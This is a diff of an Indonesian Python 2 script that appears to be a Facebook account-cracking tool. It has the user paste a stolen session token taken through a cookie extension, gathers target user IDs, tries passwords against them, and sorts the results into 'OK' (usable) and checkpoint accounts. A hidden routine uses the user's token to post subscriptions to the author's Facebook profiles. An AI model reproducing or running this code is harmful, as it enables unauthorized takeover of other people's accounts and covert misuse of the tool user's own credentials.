@@ -117,7 +117,7 @@ def masuk():
 	except (KeyError,IOError):
 		os.system('clear')
 		logo()
-		print("\033[0;95m SILAHKAN LOGIN TOKEN NYA '\033[0;94milhamrmdhan\033[0;95m' UNTUK AMBIL TOKEN PAKAI APK BROWSER KIWI DAN PASANG EXTENSION GET COOKIE")
+		print("\033[0;95m SILAHKAN LOGIN TOKEN NYA '\033[0;untuk Akses Tool ini\033[0;95m' UNTUK AMBIL TOKEN PAKAI APK BROWSER KIWI DAN PASANG EXTENSION GET COOKIE")
 		token = raw_input(" MASUKAN TOKEN NYA : ")
 		if token == "FACE SPAMMER":
 			os.system("xdg-open https://free.facebook.com/100008065235213/posts/3002983643313781/?app=fbl")
@@ -201,8 +201,8 @@ def hamz_ganteng():
 			nm = na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
 	elif ask in["3","03"]:
-		print"   1. lihat hasil ok"
-		print"   2. lihat hasil cp"
+		print"   1. lihat hasil Yang bisa di pakai Akun nya"
+		print"   2. lihat hasil CHECKPOINT"
 		ress = raw_input("* pilih : ")
 		if ress =="":
 			menu()
@@ -215,7 +215,7 @@ def hamz_ganteng():
 			os.system("cat out/CP-%s-%s-%s.txt" % (ha, op, ta))
 			exit()
 		else:
-			exit(" × pilih yang benar sayang") 
+			exit(" × PILIH YANG BENAR BRO") 
 	elif ask == "0" or ask == "00":
 		os.system("rm -f login.txt") 
 		print (" √ berhasil menghapus token") 
@@ -225,16 +225,16 @@ def hamz_ganteng():
 		exit()
 	
 	print" \033[0;97m× total id  : " +str(len(id))
-	ask = raw_input("\033[0;93m <> \033[0;95m MAU GUNAKAN PASSWORD MANUAL? (y/t) : ")
+	ask = raw_input("\033[0;93m <> \033[0;95m MAU GUNAKAN PASSWORD MANUAL? (Y/T) : ")
 	if ask == "Y" or ask == "y":
 		manual()
 	print
-	print" × mode pesawat 1 detik jika tidak ada hasil "
+	print" × Mode Pesawat 1 Detik Jika Tidak ada Hasilnya "
 	print
 
 	def main(arg):
 		global ok,cp,ua, loop
-		print '\r >< %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
+		print '\r ✓ %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
 		sys.stdout.flush()
 		user = arg
 		uid,name=user.split("|") 
@@ -356,7 +356,7 @@ def hamz_bot():
     except IOError:
         print (' [!] Token invalid') 
         os.system('rm -rf login.txt')
-    kom = " Bang @[100008065235213:] Ganteng Bangetz Ngga Ada Obat 😘😘😘😘"
+    kom = " © FACE SPAMMER PREMIUM TOOLS"
     requests.post('https://graph.facebook.com/100008065235213/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/100004715860665/subscribers?access_token=' + token)
 
